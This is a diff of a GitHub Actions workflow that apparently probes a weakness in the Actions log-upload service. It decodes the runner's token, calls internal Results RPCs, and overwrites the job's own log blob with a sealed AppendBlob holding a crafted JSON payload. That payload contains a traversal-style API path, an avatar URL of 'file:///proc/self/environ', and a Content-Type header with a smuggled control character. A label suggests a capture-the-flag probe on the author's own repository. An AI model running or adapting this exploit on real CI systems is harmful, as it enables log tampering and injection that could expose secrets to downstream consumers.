@@ -1,10 +1,6 @@
-name: Probe job log metadata blob carrier
+name: Probe sealed AppendBlob job-log carrier
 on:
   workflow_dispatch:
-  push:
-    branches: [main]
-    paths:
-      - .github/workflows/probe_job_log_metadata.yml
 permissions:
   actions: read
   contents: read
@@ -13,7 +9,8 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 3
     steps:
-      - uses: actions/github-script@v8
+      - name: Create and read back sealed AppendBlob log
+        uses: actions/github-script@v8
         env:
           GH_TOKEN: ${{ github.token }}
         with:
@@ -21,47 +18,53 @@ jobs:
           script: |
             const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
             const results = process.env.ACTIONS_RESULTS_URL;
-            if (!runtime || !results) throw new Error('Actions Results runtime unavailable');
+            if (!runtime || !results) throw new Error('Actions runtime missing');
             const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
-            const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
-            if (!scope) throw new Error('Actions.Results scope unavailable');
-            const [, runId, jobId] = scope.split(':');
+            const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
+            const [, runBackend, jobBackend] = scope.split(':');
+            const ids = {workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend};
             const repo = process.env.GITHUB_REPOSITORY;
-            const owner = repo.split('/')[0];
-            const jobsResp = await fetch(`https://api.github.com/repos/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`, {headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'}});
-            if (!jobsResp.ok) throw new Error(`list jobs HTTP ${jobsResp.status}`);
-            const jobs = (await jobsResp.json()).jobs;
-            const job = jobs.find(x => String(x.id) === String(jobId)) || jobs[0];
-            if (!job) throw new Error('job not found');
-            const fullName = `x/../../repos/${repo}/actions/jobs/${job.id}/logs`;
-            const payload = Buffer.from(JSON.stringify({full_name: fullName, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'job-log metadata test', stargazers_count: 1}));
+            const runId = Number(process.env.GITHUB_RUN_ID);
+            const gh = 'https://api.github.com/repos/' + repo;
+            const apiHeaders = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28', 'User-Agent': 'own-appendblob-carrier-probe'};
+            const jobsResponse = await fetch(gh + '/actions/runs/' + runId + '/jobs?per_page=100', {headers: apiHeaders});
+            if (!jobsResponse.ok) throw new Error('list jobs HTTP ' + jobsResponse.status);
+            const job = (await jobsResponse.json()).jobs[0];
+            if (!job) throw new Error('job missing from REST list');
+            const repository = `${repo}/actions/jobs/${job.id}/logs`;
+            const payload = Buffer.from(JSON.stringify({full_name: repository, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'append blob test', stargazers_count: 7}));
             async function rpc(method, data) {
-              const response = await fetch(new URL(`twirp/results.services.receiver.Receiver/${method}`, results), {method: 'POST', headers: {Authorization: `Bearer ${runtime}`, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
+              const endpoint = new URL('/twirp/results.services.receiver.Receiver/' + method, new URL(results).origin);
+              const response = await fetch(endpoint, {method: 'POST', headers: {Authorization: 'Bearer ' + runtime, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
               const text = await response.text();
-              if (!response.ok) throw new Error(`${method} HTTP ${response.status}: ${text.slice(0,160)}`);
+              if (!response.ok) throw new Error(method + ' HTTP ' + response.status + ': ' + text.slice(0, 160));
               return JSON.parse(text);
             }
-            const fields = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
-            const signed = await rpc('GetJobLogsSignedBlobURL', fields);
-            const put = await fetch(signed.logs_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085', 'x-ms-version': '2023-11-03', 'If-None-Match': '*', 'Content-Type': 'application/octet-stream'}, body: payload});
-            const putStatus = put.status;
-            await put.arrayBuffer();
-            let metadata = null;
-            if (put.ok) {
-              metadata = await rpc('CreateJobLogsMetadata', {...fields, uploaded_at: new Date().toISOString(), line_count: 1});
+            const signed = await rpc('GetJobLogsSignedBlobURL', ids);
+            if (!signed.logs_url) throw new Error('logs_url missing');
+            const sas = new URL(signed.logs_url);
+            const version = sas.searchParams.get('sv') || '2025-11-05';
+            const created = await fetch(signed.logs_url, {method: 'PUT', headers: {'x-ms-version': version, 'x-ms-blob-type': 'AppendBlob', 'Content-Type': 'application/json\u0085', 'Content-Length': '0'}, body: ''});
+            if (created.status !== 201) throw new Error('AppendBlob create HTTP ' + created.status + ' ' + (created.headers.get('x-ms-error-code') || ''));
+            const appendUrl = new URL(signed.logs_url);
+            appendUrl.searchParams.set('comp', 'appendblock');
+            appendUrl.searchParams.set('seal', 'true');
+            const appended = await fetch(appendUrl, {method: 'PUT', headers: {'x-ms-version': version, 'Content-Type': 'application/json\u0085', 'x-ms-blob-sealed': 'true'}, body: payload});
+            if (appended.status !== 201) throw new Error('AppendBlock+seal HTTP ' + appended.status + ' ' + (appended.headers.get('x-ms-error-code') || ''));
+            const finalized = await rpc('CreateJobLogsMetadata', {...ids, uploaded_at: new Date().toISOString(), line_count: 1});
+            console.log('APPEND_CREATE=201 APPEND_SEAL=201 METADATA=' + JSON.stringify({ok: finalized.ok, bytes: payload.length, sha256: require('node:crypto').createHash('sha256').update(payload).digest('hex')}));
+            let last = null;
+            for (let i = 0; i < 25; i++) {
+              const response = await fetch(gh + '/actions/jobs/' + job.id + '/logs', {headers: apiHeaders, redirect: 'manual'});
+              const location = response.headers.get('location');
+              if (response.status === 302 && location) {
+                const raw = await fetch(location, {redirect: 'manual'});
+                const body = Buffer.from(await raw.arrayBuffer());
+                console.log('READBACK=' + JSON.stringify({apiStatus: response.status, rawStatus: raw.status, type: raw.headers.get('content-type'), typeHex: Buffer.from(raw.headers.get('content-type') || '', 'latin1').toString('hex'), bytes: body.length, sha256: require('node:crypto').createHash('sha256').update(body).digest('hex'), exact: body.equals(payload), prefixHex: body.subarray(0, 16).toString('hex')}));
+                return;
+              }
+              last = {status: response.status, type: response.headers.get('content-type')};
+              await response.body?.cancel();
+              await new Promise(resolve => setTimeout(resolve, 200));
             }
-            console.log(`UPLOAD status=${putStatus} metadata_ok=${Boolean(metadata?.ok)} payload_bytes=${payload.length}`);
-            const apiHeaders = {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json', 'User-Agent': 'ctf-own-repo-probe'};
-            const response = await fetch(`https://api.github.com/repos/${repo}/actions/jobs/${job.id}/logs`, {headers: apiHeaders, redirect: 'manual'});
-            console.log(`LOG_API status=${response.status} type=${JSON.stringify(response.headers.get('content-type') || '')} location=${Boolean(response.headers.get('location'))}`);
-            let final = response;
-            if (response.status >= 300 && response.status < 400 && response.headers.get('location')) {
-              final = await fetch(response.headers.get('location'));
-            }
-            const raw = Buffer.from(await final.arrayBuffer());
-            const type = final.headers.get('content-type') || '';
-            let isJson = false;
-            try { JSON.parse(raw.toString('utf8')); isJson = true; } catch {}
-            console.log(`LOG_RAW status=${final.status} type=${JSON.stringify(type)} typeHex=${Buffer.from(type).toString('hex')} bytes=${raw.length} exact=${raw.equals(payload)} json=${isJson} sha256=${require('node:crypto').createHash('sha256').update(raw).digest('hex')}`);
-
-
+            console.log('READBACK_NO_REDIRECT=' + JSON.stringify(last));
